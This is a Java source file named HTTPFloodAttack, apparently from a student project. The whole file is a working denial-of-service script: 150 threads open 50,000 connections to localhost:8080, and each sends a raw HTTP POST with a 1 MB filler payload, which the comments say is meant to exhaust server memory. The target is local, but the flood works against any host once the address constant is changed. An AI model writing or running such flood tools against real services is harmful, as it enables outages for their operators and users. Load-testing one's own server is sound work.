package io.codeforall.fanstatics;

import java.io.IOException;
import java.io.OutputStream;
import java.net.Socket;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class HTTPFloodAttack {
    private static final String SERVER_ADDRESS = "localhost";
    private static final int SERVER_PORT = 8080;
    private static final int REQUESTS = 50000; // Large number of requests
    private static final int PAYLOAD_SIZE = 1024 * 1024; // 1 MB payload to increase memory usage

    public static void main(String[] args) {
        ExecutorService executorService = Executors.newFixedThreadPool(150);

        // Create a large payload to maximize memory consumption on the server
        StringBuilder payloadBuilder = new StringBuilder();
        for (int i = 0; i < PAYLOAD_SIZE; i++) {
            payloadBuilder.append("A"); // Filling the payload with 'A' characters
        }
        String payload = payloadBuilder.toString();

        for (int i = 0; i < REQUESTS; i++) {
            executorService.submit(() -> {
                try (Socket socket = new Socket(SERVER_ADDRESS, SERVER_PORT);
                     OutputStream out = socket.getOutputStream()) {

                    // Send a large HTTP-like request
                    String request = "POST / HTTP/1.1\r\n" +
                            "Host: " + SERVER_ADDRESS + "\r\n" +
                            "Content-Length: " + payload.length() + "\r\n" +
                            "\r\n" + payload;
                    out.write(request.getBytes());
                    out.flush();
                    System.out.println("Sent large HTTP request to server.");

                } catch (IOException e) {
                    System.err.println("Request failed: " + e.getMessage());
                }
            });
        }

        executorService.shutdown();
    }
}



